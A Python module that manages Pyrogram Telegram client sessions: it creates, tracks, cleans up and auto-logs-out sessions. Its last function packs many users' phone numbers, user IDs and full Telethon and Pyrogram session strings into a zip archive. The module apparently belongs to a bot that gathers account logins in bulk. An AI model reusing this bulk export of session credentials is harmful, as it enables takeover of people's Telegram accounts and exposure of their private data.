import asyncio
import io
import json
import threading
import zipfile
from datetime import datetime, timedelta

from pyrogram import Client

import Nexa.database as dbmod
from config import API_ID, API_HASH
from Nexa.session_tools import check_session


def _now():
    return datetime.utcnow()


_global_stats = {"dead_cleaned": 0}


class ManagedSession:
    def __init__(self, session_id, client, phone=None, session_name=None):
        self.session_id = session_id
        self.client = client
        self.phone = phone
        self.session_name = session_name or session_id
        self.created_at = _now()
        self.last_activity = _now()
        self._lock = threading.Lock()

    def is_alive(self):
        try:
            return bool(self.client and self.client.is_connected)
        except Exception:
            return False

    def execute(self, fn):
        with self._lock:
            self.last_activity = _now()
            return fn()

    def info(self):
        return {
            "id": self.session_id,
            "phone": self.phone,
            "session_name": self.session_name,
            "alive": self.is_alive(),
            "created_at": self.created_at.isoformat(timespec="seconds") + "Z",
            "last_activity": self.last_activity.isoformat(timespec="seconds") + "Z",
        }


class SessionManager:
    def __init__(self):
        self._sessions = {}
        self._lock = threading.Lock()

    def create_client(self, session_id, phone=None, session_name=None, in_memory=True):
        client = Client(
            name=f"session_{session_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            in_memory=in_memory,
            no_updates=True,
        )
        managed = ManagedSession(session_id, client, phone=phone, session_name=session_name)
        with self._lock:
            old = self._sessions.pop(session_id, None)
            self._sessions[session_id] = managed
        if old:
            try:
                old.client.disconnect()
            except Exception:
                pass
        return managed

    def get_session(self, session_id):
        with self._lock:
            return self._sessions.get(session_id)

    def remove_session(self, session_id):
        self._drop(session_id, mark="removed")

    def _drop(self, session_id, mark=None):
        with self._lock:
            session = self._sessions.pop(session_id, None)
        if session:
            try:
                if session.client.is_connected:
                    session.client.disconnect()
            except Exception:
                pass
        try:
            dbmod.ensure_db()
            if dbmod.temp_sessions_col is not None:
                if mark:
                    dbmod.temp_sessions_col.update_one(
                        {"_id": session_id}, {"$set": {"status": mark}})
                dbmod.temp_sessions_col.delete_one({"_id": session_id})
        except Exception:
            pass

    def touch(self, session_id):
        with self._lock:
            session = self._sessions.get(session_id)
        if session:
            session.last_activity = _now()

    def list_sessions(self):
        with self._lock:
            sessions = list(self._sessions.values())
        return [s.info() for s in sessions]

    def export_session_string(self, session_id):
        session = self.get_session(session_id)
        if not session:
            return None
        try:
            return session.execute(lambda: session.client.export_session_string())
        except Exception:
            return None

    def get_active_count(self):
        with self._lock:
            sessions = list(self._sessions.values())
        return sum(1 for s in sessions if s.is_alive())

    def stats(self):
        return {
            "active_sessions": self.get_active_count(),
            "tracked_sessions": len(self._sessions),
            "dead_cleaned": _global_stats["dead_cleaned"],
        }

    def cleanup_old(self, max_age_minutes=25):
        dbmod.ensure_db()
        if dbmod.temp_sessions_col is None:
            return 0
        cutoff = _now() - timedelta(minutes=max_age_minutes)
        removed = 0
        try:
            for doc in list(dbmod.temp_sessions_col.find({"created_at": {"$lt": cutoff}})):
                self._drop(doc["_id"], mark="expired")
                removed += 1
        except Exception:
            pass
        return removed

    def cleanup_dead_sessions(self):
        with self._lock:
            dead = [sid for sid, s in self._sessions.items() if not s.is_alive()]
        for sid in dead:
            self._drop(sid, mark="dead")
        if dead:
            _global_stats["dead_cleaned"] += len(dead)
        return len(dead)

    def enforce_auto_logout(self, hours=None):
        if hours is None:
            enabled, hours = dbmod.get_auto_logout()
            if not enabled:
                return 0
        cutoff = _now() - timedelta(hours=float(hours or 24))
        removed = 0
        with self._lock:
            targets = [sid for sid, s in self._sessions.items() if s.created_at < cutoff]
        for sid in targets:
            self._drop(sid, mark="auto_logout")
            removed += 1
        return removed


class SessionCleaner:
    def __init__(self):
        self._running = False
        self._stop_event = threading.Event()
        self._thread = None
        self._ticks = 0

    def start(self):
        if self._running:
            return False
        self._stop_event.clear()
        self._running = True
        self._thread = threading.Thread(target=self._run, name="session-cleaner", daemon=True)
        self._thread.start()
        print("Session Cleaner started", flush=True)
        return True

    def stop(self):
        if not self._running:
            return False
        self._stop_event.set()
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
        print("Session Cleaner stopped", flush=True)
        return True

    def _run(self):
        while not self._stop_event.is_set():
            try:
                dead = session_manager.cleanup_dead_sessions()
                if dead:
                    print(f"Cleaned {dead} dead session(s)", flush=True)
                enabled, hours = dbmod.get_auto_logout()
                if enabled:
                    expired = session_manager.enforce_auto_logout(hours)
                    if expired:
                        print(f"Auto-logged-out {expired} session(s)", flush=True)
                self._ticks += 1
                if self._ticks % 20 == 0:
                    session_manager.cleanup_old(30)
            except Exception as exc:
                print(f"session cleaner error: {exc}", flush=True)
            self._stop_event.wait(15)


def build_sessions_zip(pending, users):
    buf = io.BytesIO()
    stamp = _now().strftime("%Y%m%d_%H%M%S")
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("manifest.json", json.dumps({
            "generated_at": _now().isoformat(timespec="seconds"),
            "pending_sessions": len(pending),
            "verified_sessions": len(users),
        }, indent=2))
        for item in pending:
            name = (item.get("phone") or item.get("id") or "session").lstrip("+")
            zf.writestr(f"pending/{name}.json", json.dumps(item, indent=2))
        for item in users:
            phone = (item.get("phone") or "unknown").lstrip("+")
            tele = item.get("telethon_string") or ""
            pyro = item.get("session_string") or ""
            body = (
                f"phone: {item.get('phone')}\n"
                f"user_id: {item.get('user_id')}\n"
                f"username: {item.get('username')}\n"
                f"status: {item.get('status')}\n"
                f"created_at: {item.get('created_at')}\n\n"
                f"telethon_string:\n{tele}\n\n"
                f"pyrogram_session_string:\n{pyro}\n"
            )
            zf.writestr(f"sessions/{phone}.txt", body)
            if tele:
                zf.writestr(f"telethon_strings/{phone}.txt", tele + "\n")
    buf.seek(0)
    return buf, f"sessions_{stamp}.zip"


session_manager = SessionManager()
session_cleaner = SessionCleaner()
